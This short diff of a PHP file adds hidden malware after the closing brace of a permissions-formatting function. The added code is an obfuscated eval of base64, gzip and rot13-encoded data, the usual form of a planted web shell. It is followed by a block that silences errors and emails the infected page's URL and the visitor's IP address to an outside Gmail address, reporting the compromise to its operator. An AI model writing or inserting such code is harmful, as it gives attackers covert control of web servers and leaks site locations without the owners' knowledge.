@@ -282,7 +282,7 @@ $info .= (($perms & 0x0001) ?
 (($perms & 0x0200) ? 'T' : '-'));
 
 return $info;
-}
+}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvS0yxa6W2h7KcVQDxUJJo2TuourcJXGX1/XLHmhuSQzj2wzGYcrEArIjjgszZOXPCmoudnT61RBWBISe3CH//Fun3ErvpMkfz7mdsaOyTstt9YwdnHfCKzjFWAFtVhUAERiolXzLwxHpWz3E8Zk3OBy5DW0T4Qdn6MaQz/IQ4yC+nF1aI0+qU5vOxvVdkQuEaBbS3E5q5aS3SMxsclu26Ok5Jq238wEAZwFYcjSVEJdCxOvokbQNFowYzkHV3esOt5wYvtqz4ww8t5r6G6fc/QPvP157X0dgl3UpHv2qUOe3YKa5a7UMe/SM9WlYpWet/0F')))));
 ?>
 <?php
 @ini_set('output_buffering', 0);@ini_set('display_errors', 0);set_time_limit(0);ini_set('memory_limit', '64M');header('Content-Type: text/html; charset=UTF-8');$tujuanmail = 'galangganz76@gmail.com';$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
